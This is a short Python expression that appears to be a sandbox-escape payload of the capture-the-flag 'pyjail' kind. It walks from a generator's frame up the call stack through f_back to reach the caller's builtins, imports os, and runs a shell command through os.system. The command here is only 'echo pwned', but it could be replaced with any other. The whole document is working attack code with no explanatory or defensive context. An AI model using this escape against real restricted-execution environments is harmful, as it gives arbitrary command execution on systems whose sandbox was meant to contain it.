[
    get := lambda obj, attr: obj.__getattribute__(attr),
    g := (g := get(g, "gi_frame") for _ in [1]),
    frame := [*g][0],
    BACK_CNT := 1,
    [(frame := get(frame, "f_back")) for _ in "x"*BACK_CNT],
    get(get(frame, "f_builtins")["__import__"]("os"), "system")("echo pwned")
]
